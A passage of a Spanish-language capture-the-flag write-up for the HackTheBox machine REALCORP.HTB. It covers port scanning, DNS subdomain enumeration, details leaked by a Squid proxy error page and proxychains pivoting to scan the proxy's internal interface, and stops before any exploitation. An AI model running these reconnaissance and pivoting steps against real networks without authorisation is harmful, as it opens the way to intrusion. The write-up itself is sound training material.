style="color:#59873A;--shiki-dark:#FFCB6B"> grep</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -oP</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">\d{1,5}/open</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> awk</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">{print $1}</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> FS=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">/</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> xargs</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> tr</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">,</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#B07D48;--shiki-dark:#BABED8"> ip_address</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">$(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">cat</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap </span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> grep</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -oP</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> sort</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -u</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> head</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -n</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#998418;--shiki-dark:#82AAFF"> echo</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -e</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">\n[*] Extracting information...\n</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> extractPorts.tmp</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#998418;--shiki-dark:#82AAFF"> echo</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -e</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">\t[*] IP Address: </span><span style="color:#B56959;--shiki-dark:#BABED8">$ip_address</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> extractPorts.tmp</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#998418;--shiki-dark:#82AAFF"> echo</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -e</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">\t[*] Open ports: </span><span style="color:#B56959;--shiki-dark:#BABED8">$ports</span><span style="color:#B56959;--shiki-dark:#C3E88D">\n</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> extractPorts.tmp</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#998418;--shiki-dark:#82AAFF"> echo</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $ports</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> tr</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -d</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">\n</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> xclip</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sel</span><span style="color:#B56959;--shiki-dark:#C3E88D"> clip</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#998418;--shiki-dark:#82AAFF"> echo</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -e</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">[*] Ports copied to clipboard\n</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> extractPorts.tmp</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> cat</span><span style="color:#B56959;--shiki-dark:#C3E88D"> extractPorts.tmp</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> rm</span><span style="color:#B56959;--shiki-dark:#C3E88D"> extractPorts.tmp</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">*</span><span style="color:#393A34;--shiki-dark:#BABED8">] Extracting information...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">        [</span><span style="color:#AB5959;--shiki-dark:#89DDFF">*</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> IP</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Address:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.10.224</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">        [</span><span style="color:#AB5959;--shiki-dark:#89DDFF">*</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> Open</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ports:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 22</span><span style="color:#B56959;--shiki-dark:#C3E88D">,53,88,3128</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#AB5959;--shiki-dark:#89DDFF">*</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8"> Ports copied to clipboard</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">nmap</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -p22,53,88,3128</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sVC</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.10.224</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -Pn</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">PORT</span><span style="color:#B56959;--shiki-dark:#C3E88D">     STATE</span><span style="color:#B56959;--shiki-dark:#C3E88D"> SERVICE</span><span style="color:#B56959;--shiki-dark:#C3E88D">      VERSION</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">22/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">   open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  ssh</span><span style="color:#B56959;--shiki-dark:#C3E88D">          OpenSSH</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 8.0</span><span style="color:#393A34;--shiki-dark:#BABED8"> (protocol </span><span style="color:#2F798A;--shiki-dark:#F78C6C">2.0</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> ssh-hostkey:</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">   3072</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 8</span><span style="color:#B56959;--shiki-dark:#C3E88D">d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c</span><span style="color:#393A34;--shiki-dark:#BABED8"> (RSA)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">   256</span><span style="color:#B56959;--shiki-dark:#C3E88D"> f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99</span><span style="color:#393A34;--shiki-dark:#BABED8"> (ECDSA)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">_</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  256</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 04</span><span style="color:#B56959;--shiki-dark:#C3E88D">:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b</span><span style="color:#393A34;--shiki-dark:#BABED8"> (ED25519)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">53/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">   open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  domain</span><span style="color:#B56959;--shiki-dark:#C3E88D">       ISC</span><span style="color:#B56959;--shiki-dark:#C3E88D"> BIND</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 9.11</span><span style="color:#B56959;--shiki-dark:#C3E88D">.20</span><span style="color:#393A34;--shiki-dark:#BABED8"> (RedHat </span><span style="color:#B56959;--shiki-dark:#C3E88D">Enterprise</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Linux</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 8</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> dns-nsid:</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">_</span><span style="color:#B56959;--shiki-dark:#C3E88D">  bind.version:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 9.11</span><span style="color:#B56959;--shiki-dark:#C3E88D">.20-RedHat-9.11.20-5.el8</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">88/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">   open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  kerberos-sec</span><span style="color:#B56959;--shiki-dark:#C3E88D"> MIT</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Kerberos</span><span style="color:#393A34;--shiki-dark:#BABED8"> (server </span><span style="color:#B56959;--shiki-dark:#C3E88D">time:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 2024</span><span style="color:#B56959;--shiki-dark:#C3E88D">-08-06</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 19</span><span style="color:#B56959;--shiki-dark:#C3E88D">:10:40Z</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">3128/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D"> open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  http-proxy</span><span style="color:#B56959;--shiki-dark:#C3E88D">   Squid</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http</span><span style="color:#B56959;--shiki-dark:#C3E88D"> proxy</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 4.11</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">_http-title:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ERROR:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> The</span><span style="color:#B56959;--shiki-dark:#C3E88D"> requested</span><span style="color:#B56959;--shiki-dark:#C3E88D"> URL</span><span style="color:#B56959;--shiki-dark:#C3E88D"> could</span><span style="color:#B56959;--shiki-dark:#C3E88D"> not</span><span style="color:#B56959;--shiki-dark:#C3E88D"> be</span><span style="color:#B56959;--shiki-dark:#C3E88D"> retrieved</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">_http-server-header:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> squid/4.11</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Service</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Info:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Host:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> REALCORP.HTB</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> OS:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Linux</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> CPE:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> cpe:/o:redhat:enterprise_linux:8</span></span></code></pre> 
<p>Los puertos abiertos que se muestran son <code>22</code> SSH, <code>53</code> DNS, <code>88</code> Kerberos y <code>3128</code> HTTP-Proxy. Nmap ya nos da el dominio de la máquina <code>REALCORP.HTB</code>. SSH normalmente no es tan interesante, así que comencemos nuestra enumeración con DNS.</p>
<h1 id="enumeration">Enumeration</h1>
<h2 id="port-53---dns">Port 53 - DNS</h2>
<p>Para la enumeración de DNS voy a utilizar la herramienta dnsenum. Como ya conocemos el dominio, podemos utilizar esta herramienta para buscar nuevos subdominios.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">dnsenum</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --threads</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 100</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --dnsserver</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.10.224</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -f</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</span><span style="color:#B56959;--shiki-dark:#C3E88D"> realcorp.htb</span></span></code></pre> 
<p><img src="/_astro/image-1.2CcBewmd_1r9XCo.webp" alt="alt text" width="733" height="142" loading="lazy" decoding="async"></p>
<p>btenemos dos subdominios interesantes <code>proxy y wpad</code> Sin embargo, al observar la dirección, parecen ser direcciones internas que el servidor DNS filtró accidentalmente. Todavía podemos agregar estas entradas a nuestro archivo <code>/etc/hosts</code>. Continuaremos nuestra enumeración mirando <code>Squid</code> (que se ejecuta en el puerto 3128).</p>
<h1 id="port-3128---http-proxy-squid">Port 3128 - HTTP-Proxy (Squid)</h1>
<p><img src="/_astro/image-2.yZQRZLMW_28Vlri.webp" alt="alt text" width="646" height="591" loading="lazy" decoding="async"></p>
<p>Obtenemos información valiosa de esta página de error:</p>
<ul>
<li>Un nombre de usuario j.nakazawa (y dominio, si no lo supiéramos ya)</li>
<li>Hora actual en la máquina (Importante, si trabajamos con Kerberos)</li>
<li>Otro subdominio srv01.realcorp.htb</li>
<li>Versión calamar 4.11</li>
</ul>
<p>Agreguemos todos los host a nuestro archivo /etc/hosts.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">10.10.10.224</span><span style="color:#B56959;--shiki-dark:#C3E88D">    srv01.realcorp.htb</span><span style="color:#B56959;--shiki-dark:#C3E88D"> realcorp.htb</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">10.197.243.31</span><span style="color:#B56959;--shiki-dark:#C3E88D">   wpad.realcorp.htb</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">10.197.243.77</span><span style="color:#B56959;--shiki-dark:#C3E88D">   ns.realcorp.htb</span><span style="color:#B56959;--shiki-dark:#C3E88D"> proxy.realcorp.htb</span></span></code></pre> 
<p>A continuación, intentemos acceder a la red interna (10.197.243.0) mediante cadenas proxy. Para esto tenemos que editar nuestra configuración de proxychains:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">sudo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nano</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /etc/proxychains.conf</span></span></code></pre> 
<p><img src="/_astro/image-3.Za4rpioS_Z1XG3hx.webp" alt="alt text" width="548" height="98" loading="lazy" decoding="async"></p>
<p>Agregamos el proxy externo a nuestra configuración de cadenas de proxy, por lo que todo el tráfico que pasa por el túnel del proxy pasará por el proxy Squid.</p>
<p>hagamos un mapeo del proxy externo al salir del túnel (lado LAN del proxy).</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">proxychains</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -q</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sT</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -Pn</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -n</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 127.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0.1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Host</span><span style="color:#B56959;--shiki-dark:#C3E88D"> discovery</span><span style="color:#B56959;--shiki-dark:#C3E88D"> disabled</span><span style="color:#393A34;--shiki-dark:#BABED8"> (-Pn). All addresses will be marked </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">up</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#393A34;--shiki-dark:#BABED8"> and scan times will be slower.</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Nmap</span><span style="color:#B56959;--shiki-dark:#C3E88D"> scan</span><span style="color:#B56959;--shiki-dark:#C3E88D"> report</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 127.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0.1</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Host</span><span style="color:#B56959;--shiki-dark:#C3E88D"> is</span><span style="color:#B56959;--shiki-dark:#C3E88D"> up</span><span style="color:#393A34;--shiki-dark:#BABED8"> (0.46s </span><span style="color:#B56959;--shiki-dark:#C3E88D">latency</span><span style="color:#393A34;--shiki-dark:#BABED8">).</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Not</span><span style="color:#B56959;--shiki-dark:#C3E88D"> shown:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 994</span><span style="color:#B56959;--shiki-dark:#C3E88D"> closed</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ports</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">PORT</span><span style="color:#B56959;--shiki-dark:#C3E88D">     STATE</span><span style="color:#B56959;--shiki-dark:#C3E88D"> SERVICE</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">22/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">   open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  ssh</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">53/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">   open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  domain</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">88/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">   open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  kerberos-sec</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">464/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">  open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  kpasswd5</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">749/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">  open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  kerberos-adm</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">3128/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D"> open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  squid-http</span></span></code></pre> 
<p>Al escanear la interfaz interna del proxy externo, obtenemos dos puertos adicionales: 464 y 749.</p>
<h2 id="accessing-internal-resources">Accessing internal resources</h2>
<p>Al acceder al proxy externamente, la configuración del proxy puede definir a qué recursos se puede acceder desde el exterior.</p>
<p>Intentemos ver si tenemos acceso al proxy interno, que según DNS es proxy.realcorp.htb (10.197.243.77)</p>
